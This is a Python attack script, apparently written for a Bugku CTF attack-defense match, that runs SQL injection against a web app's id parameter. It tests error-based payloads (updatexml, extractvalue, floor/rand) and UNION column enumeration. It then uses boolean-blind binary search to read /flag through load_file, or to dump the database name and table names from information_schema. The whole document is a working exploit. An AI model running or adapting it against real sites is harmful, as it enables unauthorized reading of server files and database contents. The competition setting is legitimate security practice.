#!/usr/bin/env python3
"""Team 117 SQL注入 - 布尔盲注提取flag"""
import requests
import time
import sys

HOST = "192-168-1-117.pvp7574.bugku.cn"
BASE_URL = f"http://{HOST}/index.php?m=Home&c=Show&a=index&id="

# 正常请求的长度
def get_length(payload):
    """获取响应长度"""
    try:
        r = requests.get(BASE_URL + payload, timeout=8)
        return len(r.text)
    except:
        return 0

# 正常页面长度
NORMAL_LEN = get_length("1")
ERROR_LEN = get_length("1'")
print(f"正常页面: {NORMAL_LEN} 字节, 错误页面: {ERROR_LEN} 字节")

if NORMAL_LEN == ERROR_LEN:
    print("[-] 注入点不可用")
    sys.exit(1)

print(f"[+] 确认注入点 (id参数)")
print()

# 测试布尔条件
def test_bool(condition):
    """测试布尔条件是否为真"""
    payload = f"1 and {condition}"
    length = get_length(payload)
    return length == NORMAL_LEN  # 如果返回正常页面，条件为真

# 1. 测试布尔盲注
print("=== 测试布尔盲注 ===")
print(f"  1=1: {test_bool('1=1')} (应为True)")
print(f"  1=2: {test_bool('1=2')} (应为False)")

# 2. 尝试报错注入
print("\n=== 报错注入 ===")
errors = [
    "1 and updatexml(1,concat(0x7e,user()),1)",
    "1 and extractvalue(1,concat(0x7e,user()))",
    "1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)",
]
for err in errors:
    r = requests.get(BASE_URL + err, timeout=8)
    if 'XPATH' in r.text or 'Duplicate' in r.text or '~' in r.text:
        # 提取报错信息
        import re
        m = re.search(r"~([^~<]+)~?", r.text)
        if m:
            print(f"  [✅] {m.group(1)}")
            break
    print(f"  [-] {err[:50]}... 无报错")

# 3. 尝试联合查询(更多列数)
print("\n=== 联合查询 ===")
for i in range(1, 25):
    cols = ','.join(str(j) for j in range(1, i+1))
    payload = f"-1 union select {cols}"
    length = get_length(payload)
    if length > 500:
        print(f"  [✅] {i} 列: {length} 字节")
        # 尝试提取数据
        for j in range(1, i+1):
            payload = f"-1 union select 1,{','.join([f"'test{j}'" if k==j else str(k+1) for k in range(i-1)])}"
            r = requests.get(BASE_URL + payload, timeout=8)
            if f'test{j}' in r.text:
                print(f"    列 {j+1} 可回显")
        break

# 4. 布尔盲注提取flag
print("\n=== 布尔盲注提取flag ===")

# 先获取flag长度
flag_len = 0
for i in range(1, 100):
    if test_bool(f"length((select load_file('/flag')))={i}"):
        flag_len = i
        print(f"  flag长度: {i}")
        break
    # 也尝试从数据库获取
    if test_bool(f"length((select flag from flag))={i}"):
        flag_len = i
        print(f"  flag长度(数据库): {i}")
        break

if flag_len == 0:
    print("  [-] 无法确定flag长度,尝试直接读取文件")
    # 尝试读取 /flag 文件
    for i in range(1, 50):
        if test_bool(f"length((select load_file('/flag')))={i}"):
            flag_len = i
            print(f"  flag文件长度: {i}")
            break

if flag_len > 0:
    # 逐字符提取
    flag = ""
    print(f"  开始提取 {flag_len} 个字符...")
    for pos in range(1, flag_len + 1):
        char = 0
        # 二分查找
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if test_bool(f"ascii(substr((select load_file('/flag')),{pos},1))>{mid}"):
                low = mid + 1
            elif test_bool(f"ascii(substr((select load_file('/flag')),{pos},1))={mid}"):
                char = mid
                break
            else:
                high = mid - 1

        if char:
            flag += chr(char)
            sys.stdout.write(f"\r  flag: {flag}")
            sys.stdout.flush()
        else:
            flag += "?"

    print(f"\n\n  [✅] flag: {flag}")
else:
    # 尝试从数据库表提取
    print("\n=== 尝试从数据库提取 ===")

    # 获取数据库
    db_name = ""
    for pos in range(1, 20):
        char = 0
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if test_bool(f"ascii(substr(database(),{pos},1))>{mid}"):
                low = mid + 1
            elif test_bool(f"ascii(substr(database(),{pos},1))={mid}"):
                char = mid
                break
            else:
                high = mid - 1
        if char:
            db_name += chr(char)
        else:
            break
    print(f"  数据库: {db_name}")

    # 获取表名
    print("  获取表名...")
    tables = ""
    for pos in range(1, 200):
        char = 0
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{pos},1))"
            if test_bool(f"{payload}>{mid}"):
                low = mid + 1
            elif test_bool(f"{payload}={mid}"):
                char = mid
                break
            else:
                high = mid - 1
        if char:
            tables += chr(char)
            sys.stdout.write(f"\r  表名: {tables}")
            sys.stdout.flush()
        else:
            break
    print(f"\n  表名: {tables}")
